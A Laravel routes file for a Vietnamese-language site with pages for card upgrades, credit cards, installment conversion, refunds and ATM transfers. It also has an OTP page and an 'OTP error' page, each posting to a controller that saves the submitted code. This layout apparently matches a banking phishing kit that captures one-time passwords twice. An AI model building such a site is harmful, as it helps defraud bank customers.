<?php

use App\Http\Controllers\OtpController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    return view('index');
});
//dang-ky-nang-cap
Route::get('/dang-ky-nang-cap', function () {
    return view('dang-ky-nang-cap');
});
//the-tin-dung
Route::get('/the-tin-dung', function () {
    return view('the-tin-dung');
});
//sang-ngang-the
Route::get('/sang-ngang-the', function () {
    return view('sang-ngang-the');
});
//chuyen-tra-gop
Route::get('/chuyen-tra-gop', function () {
    return view('chuyen-tra-gop');
});
//yeu-cau-huy-the
Route::get('/yeu-cau-huy-the', function () {
    return view('yeu-cau-huy-the');
});
//hoan-tien
Route::get('/hoan-tien', function () {
    return view('hoan-tien');
});
//chuyen-tien-atm
Route::get('/chuyen-tien-atm', function () {
    return view('chuyen-tien-atm');
});
//otp
Route::get('/otp', function () {
    return view('otp');
});
Route::post('/otp-post', [OtpController::class, 'save'])->name('otp_post');
//otp-error
Route::get('/otp-error', function () {
    return view('otp-error');
});
//otp_error_post
Route::post('/otp-error-post', [OtpController::class, 'saveError'])->name('otp_error_post');
